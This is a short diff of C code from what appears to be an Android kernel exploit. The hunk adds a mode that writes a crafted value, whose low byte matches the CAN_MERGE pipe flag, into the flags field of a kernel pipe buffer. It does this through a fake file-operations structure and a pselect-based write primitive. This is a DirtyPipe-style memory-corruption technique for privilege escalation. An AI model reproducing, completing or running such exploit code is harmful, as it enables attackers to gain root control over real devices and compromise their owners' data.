@@ -401,6 +401,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                 : (uint64_t)ASHMEM_MISC_FOPS_OFF;
         g_main_pc = (uint64_t)fake_fops;
         g_main_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
+        if (env_flag("MODE4_PIPE_FLAG", 0) && page_base) {
+          /* VALUE = page base + 0x10 (low byte 0x10 = CAN_MERGE exactly).
+           * 32KB-aligned base → clean bit pattern, no PACKET/LRU/GIFT. */
+          g_main_pc = (uint64_t)page_base + 0x10;
+          g_main_left = (uint64_t)pselect_write_target();
+          pr_info("JC2 PIPE_FLAG: pc=%016llx (CAN_MERGE) left=%016llx "
+                  "(&pipe_buffer.flags)\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
       }
       /*
        * word6 (task): MUST be the waiter thread's own task — our 5.10
